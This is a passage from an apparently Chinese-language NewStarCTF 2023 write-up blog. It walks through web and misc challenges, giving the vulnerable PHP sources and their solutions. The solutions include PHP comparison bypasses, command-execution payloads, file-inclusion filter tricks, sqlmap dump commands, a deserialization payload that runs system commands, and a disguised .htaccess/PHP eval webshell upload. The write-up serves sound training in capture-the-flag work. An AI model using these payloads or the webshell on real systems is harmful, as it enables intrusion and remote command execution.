class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs makefile">base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk)<br>n3wst4rCTF2023g00000d<br>secret=n3wst4rCTF2023g00000d<br>很强，现在我需要验证你的<br><br>power 是否是ctfer 只有ctfer可以通过这关<br><br><span class="hljs-section">Cookie: power=ctfer</span><br><br>使用 NewStarCTF2023浏览器 来通过这关!<br><br><span class="hljs-section">User-Agent: NewStarCTF2023</span><br><br><span class="hljs-section">Referer: newstarctf.com</span><br><br>本地用户<br><br><span class="hljs-section">X-Real-IP:127.0.0.1</span><br></code></pre></td></tr></table></figure><p><code>flag&#123;73830fa0-1fe2-4beb-9d6b-9e5025480203&#125;</code></p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><p>PHP是世界上最安全的语言，真的吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$flag1</span> = True;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>      <span class="hljs-variable">$flag2</span> = True;<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-variable">$flag3</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>      <span class="hljs-variable">$flag4</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>  <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>  <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>  &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>数组绕过强比较POST：payload：<code>key3[]=1</code></p><p><code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)) == 0</code>中<code>file_get_contents(&quot;/flag&quot;)</code>的值是字符串</p><p>这里strcmp有一个bug就是如果比较的是数组的话，直接返回一个0。</p><p>payload：<code>key4[]=1</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">!<span class="hljs-built_in">is_numeric</span>($_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;key5&#x27;</span>]</span>) &amp;&amp; $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;key5&#x27;</span>]</span> &gt; <span class="hljs-number">2023</span><br></code></pre></td></tr></table></figure><p><code>is_numeric</code>函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。</p><p>payload：<code>key5=2024%00</code></p><p>要求键值即<code>=</code>后面的值不是<code>字母、数字</code></p><p>完整payload：</p><p>GET：<code>?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1&amp;key5=2024%00</code></p><p>POST：<code>key3[]=*&amp;flag5=*</code></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>  <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/NewStarCTF2023/image-20231022225113765.png" alt="image-20231022225113765"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">password</span>=evcxdcczxrbdw&amp;e[v.a.<span class="hljs-attribute">l</span>=echo `tac /fl??`;<br></code></pre></td></tr></table></figure><p>tac换成sort也行</p><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>注册登录进去是一个<code>chat对话框</code>没用</p><p><code>ctrl+d</code>退出对话框，翻遍<code>Linux</code>啥都没</p><p>按方向上键查询历史记录，得到密码是弱密码</p><p>试出来密码是<code>000000</code></p><p>再登陆终端，提示试用burp</p><p><code>admin</code>登录抓包</p><p>发现<code>/passport</code>的302跳转</p><p><img src="/2023/10/23/NewStarCTF2023/1697986347417.png" alt="1697986347417"></p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h3><p>打开发现要玩游戏超过十万分</p><p>搜索<code>alter</code>，发现没有flag</p><p>查看<code>app.js</code>，把分数改成<code>10</code></p><p><img src="/2023/10/23/NewStarCTF2023/1697986810431.png" alt="1697986810431"></p><p>抓包</p><p><img src="/2023/10/23/NewStarCTF2023/1697986829775.png" alt="1697986829775"></p><p><code>score</code>修改大于100000，得到flag</p><p><img src="/2023/10/23/NewStarCTF2023/1697986849830.png" alt="1697986849830"></p><h3 id="include-O。O"><a href="#include-O。O" class="headerlink" title="include O。O"></a>include O。O</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>  @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>猜测题目对flag进行了<code>base/rot</code>过滤</p><p>payload：<code>?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">80</span>aa7b2f-<span class="hljs-number">6</span>f0e-<span class="hljs-number">46</span>bb-<span class="hljs-number">8233</span>-<span class="hljs-number">3046</span>e5a8a11a&#125;<br></code></pre></td></tr></table></figure><h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p>sqlmap一把梭</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;url?id=TMP0919&quot;</span> <span class="hljs-attr">--dbs</span> <span class="hljs-attr">--batch</span><br>python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;url/?id=TMP0919&quot;</span>  -D ctf <span class="hljs-attr">--tables</span> <span class="hljs-attr">--batch</span><br>python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;url/?id=TMP0919&quot;</span> -D ctf -T here_is_flag <span class="hljs-attr">--columns</span> <span class="hljs-attr">--batch</span><br>python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;url/?id=TMP0919&quot;</span>  -D ctf -T here_is_flag -C flag <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span><br>flag&#123;a08ce636-<span class="hljs-number">0</span>f3d-<span class="hljs-number">49</span>f9-a6ef-be72d058bec2&#125;<br></code></pre></td></tr></table></figure><h3 id="Unserialize"><a href="#Unserialize" class="headerlink" title="Unserialize"></a>Unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Maybe you need learn some knowledge about deserialize?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>      @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>  &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;unser&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用<code>POST</code>提交<code>unser</code>，进行反序列化，cmd的值不含<code>cat、tac、more、tail、base</code>的大小写变形，就执行<code>system($this-&gt;cmd)</code>命令</p><p>先<code>ls /</code></p><p>payload：<code>unser=O:4:&quot;evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;</code></p><p>回显中有 <code>th1s_1s_fffflllll4444aaaggggg</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">unser</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;evil&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cmd&quot;</span>;s:<span class="hljs-number">35</span>:<span class="hljs-string">&quot;sort /th1s_1s_fffflllll4444aaaggggg&quot;</span>;&#125;<br><span class="hljs-attribute">flag</span>&#123;d2195283-<span class="hljs-number">49</span>ad-<span class="hljs-number">403</span>d-<span class="hljs-number">9</span>ec7-fbf8d9440fa1&#125;<br></code></pre></td></tr></table></figure><h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p><code>.htaccess</code>解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;FilesMatch &quot;3.png&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>然后上传<code>3.png</code>内容是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;password&#x27;]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>蚁剑连接即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">76577</span>f9b-fda7-<span class="hljs-number">4362</span>-a0f2-<span class="hljs-number">0</span>a21e9f6c435&#125;<br></code></pre></td></tr></table></figure><h3 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p>dirmap扫描发现</p><p><code>/.git/config</code>  、<code>index.php</code>、<code>index.php/login</code></p><p>发现后面两个没用</p><p><code>githacker</code>扫描一下</p><p><img src="/2023/10/23/NewStarCTF2023/1697196980019.jpg" alt="1697196980019"></p><p><code>bo0g1pop.php</code>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/9360#toc-8">PHP的无参数RCE - 先知社区 (aliyun.com)</a></p><p>参考这篇博客</p><p>getallheaders() 在最后加的话用bp打好像并不是最后一个，试了好多种别的办法无果，但是 next() 后是ua头，直接改ua</p><p>利用 payload: <code>system(next(getallheaders()));</code></p><p><img src="/2023/10/23/NewStarCTF2023/1697197213357.jpg" alt="1697197213357"></p><p>在根目录下有flag</p><p><img src="/2023/10/23/NewStarCTF2023/1697197251490.jpg" alt="1697197251490"></p><h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h2><h3 id="永不消逝的电波"><a href="#永不消逝的电波" class="headerlink" title="永不消逝的电波"></a>永不消逝的电波</h3><p>在线morse解密</p><h3 id="1-序章"><a href="#1-序章" class="headerlink" title="1-序章"></a>1-序章</h3><p>给了一个SQL盲注的日志，注入正确后会进入下一位的注入，例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-operator">-</span> <span class="hljs-operator">-</span> [<span class="hljs-number">20</span><span class="hljs-operator">/</span>Aug<span class="hljs-operator">/</span><span class="hljs-number">2023</span>:<span class="hljs-number">00</span>:<span class="hljs-number">08</span>:<span class="hljs-number">44</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span>] &quot;GET /app/action/edit_sell.php?pid%5B0%5D=-1%20or%20if(ascii(substr((select%20group_concat(username,password)%20from%20user),7,1))=110,sleep(1),1)--+&amp;totalPrice=0 HTTP/1.1&quot; <span class="hljs-number">500</span> <span class="hljs-number">353</span> &quot;-&quot; &quot;python-requests/2.28.2&quot;<span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-operator">-</span> <span class="hljs-operator">-</span> [<span class="hljs-number">20</span><span class="hljs-operator">/</span>Aug<span class="hljs-operator">/</span><span class="hljs-number">2023</span>:<span class="hljs-number">00</span>:<span class="hljs-number">08</span>:<span class="hljs-number">47</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span>] &quot;GET /app/action/edit_sell.php?pid%5B0%5D=-1%20or%20if(ascii(substr((select%20group_concat(username,password)%20from%20user),8,1))=40,sleep(1),1)--+&amp;totalPrice=0 HTTP/1.1&quot; <span class="hljs-number">500</span> <span class="hljs-number">353</span> &quot;-&quot; &quot;python-requests/2.28.2&quot;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> urllib <br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;access.log&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>lines = f.readlines()<br>datas = []<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:    <br>    t = urllib.unquote(line)     <br>    datas.append(t) <br>flag_ascii = &#123;&#125;  <br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> datas:    <br>matchObj = re.search( <span class="hljs-string">r&#x27;user\),(.*?),1\)\)=(.*?),sleep&#x27;</span>, data)    <br>    <span class="hljs-keyword">if</span> matchObj:        <br>        key = <span class="hljs-built_in">int</span>(matchObj.group(<span class="hljs-number">1</span>))        <br>        value = <span class="hljs-built_in">int</span>(matchObj.group(<span class="hljs-number">2</span>))        <br>        flag_ascii[key] = value        <br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> flag_ascii.values():    <br>    flag += <span class="hljs-built_in">chr</span>(value)    <br><span class="hljs-built_in">print</span> flag<br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/NewStarCTF2023/sql.png" alt="sql"></p><h3 id="新建Word文档"><a href="#新建Word文档" class="headerlink" title="新建Word文档"></a>新建Word文档</h3><p>新佛曰：毘諸隸僧降吽諸陀摩隸僧缽薩願毘耨咤陀願羅咤喃修願宣亦宣寂叻寂阿是吽阿塞尊劫毘般毘所聞降毘咒塞尊薩咒毘所若降般斯毘嚴毘嚴波斯迦毘色毘波嚴毘喃念若修嘚般毘我毘如毘如囑囑</p><p>搜索在线解密</p><p><code>flag&#123;Th1s_F0_1s_s00_Cyp3r_495586e3df3a&#125;</code></p><h3 id="base！"><a href="#base！" class="headerlink" title="base！"></a>base！</h3><p>给了一个base.txt</p><p>里面是好多行的base64</p><p>猜测是base64隐写</p><p><code>iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</code></p><p>base58解得</p><p><code>flag&#123;b4se_1s_4_g0od_c0d3&#125;</code></p><h3 id="jvav"><a href="#jvav" class="headerlink" title="jvav"></a>jvav</h3><p>java盲水印</p><p><a href="https://github.com/ww23/BlindWatermark">https://github.com/ww23/BlindWatermark</a></p><p><code>java -jar BlindWatermark-v0.0.3.jar decode -c challenge.png 1.png</code></p><p><img src="/2023/10/23/NewStarCTF2023/1.png" alt="1"></p><h3 id="WebShell的利用"><a href="#WebShell的利用" class="headerlink" title="WebShell的利用"></a>WebShell的利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&quot;eval(str_rot13(convert_uudecode(str_rot13(base64_decode(&#x27;&#x27;)))));&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">50</span>; <span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/base64/&quot;</span>,<span class="hljs-variable">$shell</span>))&#123;<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/eval/&quot;</span>,<span class="hljs-string">&quot;return &quot;</span>,<span class="hljs-variable">$shell</span>);<br>        <span class="hljs-variable">$shell</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tmp</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$shell</span>;<br></code></pre></td></tr></table></figure><p><code>error_reporting(0);($_GET[&#39;7d67973a&#39;])($_POST[&#39;9fa3&#39;]);</code></p><p>GET：<code>?7d67973a=system</code></p><p>POST：<code>9fa3=ls /</code></p><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = 